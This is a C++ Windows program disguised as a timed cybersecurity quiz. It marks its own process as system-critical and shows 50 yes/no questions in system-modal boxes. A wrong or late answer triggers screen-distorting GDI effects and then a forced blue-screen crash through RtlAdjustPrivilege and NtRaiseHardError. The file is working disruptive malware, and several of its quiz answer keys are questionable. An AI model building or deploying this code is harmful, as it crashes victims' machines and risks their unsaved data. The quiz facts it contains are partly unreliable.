#include <windows.h>
#include <winternl.h>
#include <vector>
#include <string>
#include <algorithm>
#include <random>

// Libraries
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG);

bool g_answered = false;

void gdi_payload() {
    int x = GetSystemMetrics(SM_CXSCREEN);
    int y = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc;
    for (int i = 0; i < 300; i++) {
        hdc = GetDC(NULL);
        BitBlt(hdc, rand() % 20 - 10, rand() % 20 - 10, x, y, hdc, 0, 0, SRCCOPY);
        PatBlt(hdc, rand() % x, rand() % y, rand() % x, rand() % y, PATINVERT);
        StretchBlt(hdc, 10, 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCAND);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

void trigger_final_crash() {
    gdi_payload();
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege && NtRaiseHardError) {
        BOOLEAN bEnabled;
        ULONG uResponse;
        RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
        NtRaiseHardError(0xC000021A, 0, 0, NULL, 6, &uResponse);
    }
    ExitProcess(1);
}

// Fixed C4100: Parameters marked as unreferenced
void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    UNREFERENCED_PARAMETER(hwnd);
    UNREFERENCED_PARAMETER(uMsg);
    UNREFERENCED_PARAMETER(idEvent);
    UNREFERENCED_PARAMETER(dwTime);
    if (!g_answered) trigger_final_crash();
}

void set_critical(BOOL status) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (NtSetInformationProcess) {
        ULONG isCritical = status ? 1 : 0;
        NtSetInformationProcess(GetCurrentProcess(), (PROCESSINFOCLASS)29, &isCritical, sizeof(ULONG));
    }
}

struct QuizItem { std::string q; int correct; };

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Fixed C4100
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);

    set_critical(TRUE);

    std::vector<QuizItem> quiz = {
        {"Q1: Does WPA3 provide better protection against offline dictionary attacks?", IDYES},
        {"Q2: Does a standard SQL Injection occur at the presentation layer?", IDNO},
        {"Q3: Is 256-bit AES considered crackable by brute force?", IDNO},
        {"Q4: Is Salting a effective countermeasure against Rainbow Table attacks?", IDYES},
        {"Q5: Does Nmap use raw IP packets to determine available hosts?", IDYES},
        {"Q6: Is MD5 still recommended for digital signatures in 2026?", IDNO},
        {"Q7: Does a VPN provide end-to-end encryption to the final destination?", IDNO},
        {"Q8: Is Cross-Site Scripting (XSS) primarily a client-side vulnerability?", IDYES},
        {"Q9: Is SSH-2 more secure than the original SSH-1 protocol?", IDYES},
        {"Q10: Is Social Engineering categorized as a non-technical attack?", IDYES},
        {"Q11: Is AES-GCM an authenticated encryption mode?", IDYES},
        {"Q12: Does a computer worm require a host program to replicate?", IDNO},
        {"Q13: Does TLS 1.3 remove support for weak cipher suites?", IDYES},
        {"Q14: Is a DMZ used to separate a trusted network from an untrusted one?", IDYES},
        {"Q15: Can SSRF attacks be used to scan internal network ports?", IDYES},
        {"Q16: Is a Honeypot used to gather intelligence on attacker techniques?", IDYES},
        {"Q17: Does the Principle of Least Privilege grant maximum user rights?", IDNO},
        {"Q18: Is MAC Filtering effective against sophisticated attackers?", IDNO},
        {"Q19: Does a Buffer Overflow involve overwriting adjacent memory?", IDYES},
        {"Q20: Is Ransomware specifically designed to extort money via encryption?", IDYES},
        {"Q21: Is Multi-Factor Authentication (MFA) more secure than 2FA?", IDYES},
        {"Q22: Is an IPS (Prevention System) strictly passive?", IDNO},
        {"Q23: Is SHA-3 the latest member of the Secure Hash Algorithm family?", IDYES},
        {"Q24: Does FTP transmit credentials in plain text?", IDYES},
        {"Q25: Is a Rootkit designed to provide highest level privileges?", IDYES},
        {"Q26: Is Telnet considered a secure communication protocol?", IDNO},
        {"Q27: Is a Botnet a collection of 'zombie' computers?", IDYES},
        {"Q28: Is performing a DoS attack on a public server legal?", IDNO},
        {"Q29: Does a Keylogger record every stroke on the keyboard?", IDYES},
        {"Q30: Does Private Browsing hide your activities from your ISP?", IDNO},
        {"Q31: Is CSRF an attack that forces an authenticated user to execute actions?", IDYES},
        {"Q32: Is the CMOS password stored in the BIOS chip?", IDYES},
        {"Q33: Is a Logic Bomb malware that executes upon a specific trigger?", IDYES},
        {"Q34: Is Juice Jacking a risk when using public USB ports?", IDYES},
        {"Q35: Is Steganography used to conceal a message within a file?", IDYES},
        {"Q36: Is the Tor network based on Onion Routing?", IDYES},
        {"Q37: Is Fuzz Testing used to find security holes in software?", IDYES},
        {"Q38: Is the Metasploit Framework used for exploit development?", IDYES},
        {"Q39: Is Burp Suite a primary tool for web application security?", IDYES},
        {"Q40: Is Air-Gapping used to isolate a computer from the internet?", IDYES},
        {"Q41: Is Bluejacking used to gain full control of a device?", IDNO},
        {"Q42: Does Symmetric encryption use two different keys?", IDNO},
        {"Q43: Is Shodan often called the 'search engine for hackers'?", IDYES},
        {"Q44: Is a Zero-Day vulnerability known to the software vendor?", IDNO},
        {"Q45: Is Wireshark capable of decrypting HTTPS with a private key?", IDYES},
        {"Q46: Is Spear Phishing a broad, non-targeted attack?", IDNO},
        {"Q47: Is Kerberos an authentication protocol for trusted networks?", IDYES},
        {"Q48: Does a logic bomb delete itself after execution?", IDYES},
        {"Q49: Is the loopback address 127.0.0.1?", IDYES},
        {"Q50: Is this the final challenge of the quiz?", IDYES}
    };

    std::random_device rd;
    std::mt19937 g(rd());
    std::shuffle(quiz.begin(), quiz.end(), g);

    for (const auto& item : quiz) {
        g_answered = false;
        UINT_PTR tId = SetTimer(NULL, 0, 10000, (TIMERPROC)TimerProc);
        int res = MessageBoxA(NULL, (item.q + "\n\n[TIME LIMIT: 10s]").c_str(), "CRITICAL_SYSTEM_AUTH", MB_YESNO | MB_ICONSTOP | MB_SYSTEMMODAL);
        g_answered = true;
        KillTimer(NULL, tId);
        if (res != item.correct) trigger_final_crash();
    }

    set_critical(FALSE);
    return 0;
}